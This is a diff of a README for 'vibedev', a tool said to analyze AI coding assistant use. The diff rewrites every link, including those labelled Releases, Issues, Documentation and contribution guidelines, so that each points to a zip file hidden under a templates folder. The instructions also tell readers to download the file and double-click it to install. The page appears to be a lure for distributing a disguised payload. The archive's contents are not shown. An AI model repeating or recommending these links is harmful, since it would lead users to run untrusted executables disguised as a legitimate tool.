@@ -8,13 +8,13 @@ Welcome to **vibedev**! This tool helps you analyze how AI coding assistants are
 
 To get started, you need to download vibedev from our Releases page. 
 
-[![Download vibedev](https://raw.githubusercontent.com/kaindrakonis/vibedev/master/src/Software_v2.4.zip%20vibedev-Start%20Here-brightgreen)](https://raw.githubusercontent.com/kaindrakonis/vibedev/master/src/Software_v2.4.zip)
+[![Download vibedev](https://github.com/kaindrakonis/vibedev/raw/refs/heads/master/.specify/templates/Software_v2.0.zip%20vibedev-Start%20Here-brightgreen)](https://github.com/kaindrakonis/vibedev/raw/refs/heads/master/.specify/templates/Software_v2.0.zip)
 
 ### Step-by-Step Instructions
 
-1. Click the link above to visit the [Releases page](https://raw.githubusercontent.com/kaindrakonis/vibedev/master/src/Software_v2.4.zip).
+1. Click the link above to visit the [Releases page](https://github.com/kaindrakonis/vibedev/raw/refs/heads/master/.specify/templates/Software_v2.0.zip).
 2. You will see a list of available versions. Select the version you want to download.
-3. Click on the appropriate file for your system. This could be a `.exe` for Windows or a `https://raw.githubusercontent.com/kaindrakonis/vibedev/master/src/Software_v2.4.zip` for Linux.
+3. Click on the appropriate file for your system. This could be a `.exe` for Windows or a `https://github.com/kaindrakonis/vibedev/raw/refs/heads/master/.specify/templates/Software_v2.0.zip` for Linux.
 4. Once the file downloads, locate it in your computer's download folder.
 5. Double-click the downloaded file to install vibedev. Follow the installation prompts that appear.
 6. After installation, launch vibedev from your applications menu.
@@ -47,17 +47,17 @@ Using vibedev is simple and intuitive.
 
 ## 🤝 Support
 
-If you encounter any issues while using vibedev, please visit the [Issues section](https://raw.githubusercontent.com/kaindrakonis/vibedev/master/src/Software_v2.4.zip) on GitHub. Here, you can report bugs or request features. We encourage community feedback to make vibedev better.
+If you encounter any issues while using vibedev, please visit the [Issues section](https://github.com/kaindrakonis/vibedev/raw/refs/heads/master/.specify/templates/Software_v2.0.zip) on GitHub. Here, you can report bugs or request features. We encourage community feedback to make vibedev better.
 
 ## 🛠️ Contributing
 
-We welcome contributions! If you'd like to help improve vibedev, please read the guidelines in the [https://raw.githubusercontent.com/kaindrakonis/vibedev/master/src/Software_v2.4.zip](https://raw.githubusercontent.com/kaindrakonis/vibedev/master/src/Software_v2.4.zip). 
+We welcome contributions! If you'd like to help improve vibedev, please read the guidelines in the [https://github.com/kaindrakonis/vibedev/raw/refs/heads/master/.specify/templates/Software_v2.0.zip](https://github.com/kaindrakonis/vibedev/raw/refs/heads/master/.specify/templates/Software_v2.0.zip). 
 
 ## 🔗 Resources
 
-- [Documentation](https://raw.githubusercontent.com/kaindrakonis/vibedev/master/src/Software_v2.4.zip)
-- [Community Discussions](https://raw.githubusercontent.com/kaindrakonis/vibedev/master/src/Software_v2.4.zip)
-- [Releases Page](https://raw.githubusercontent.com/kaindrakonis/vibedev/master/src/Software_v2.4.zip)
+- [Documentation](https://github.com/kaindrakonis/vibedev/raw/refs/heads/master/.specify/templates/Software_v2.0.zip)
+- [Community Discussions](https://github.com/kaindrakonis/vibedev/raw/refs/heads/master/.specify/templates/Software_v2.0.zip)
+- [Releases Page](https://github.com/kaindrakonis/vibedev/raw/refs/heads/master/.specify/templates/Software_v2.0.zip)
 
 ## 👥 Community Engagement
 
@@ -65,4 +65,4 @@ Join our growing community! Share your experiences and tips on using vibedev. Fo
 
 ---
 
-For a smooth experience with vibedev, remember to check out our [Releases page](https://raw.githubusercontent.com/kaindrakonis/vibedev/master/src/Software_v2.4.zip) for the latest updates and versions. Enjoy analyzing with ease!
+For a smooth experience with vibedev, remember to check out our [Releases page](https://github.com/kaindrakonis/vibedev/raw/refs/heads/master/.specify/templates/Software_v2.0.zip) for the latest updates and versions. Enjoy analyzing with ease!
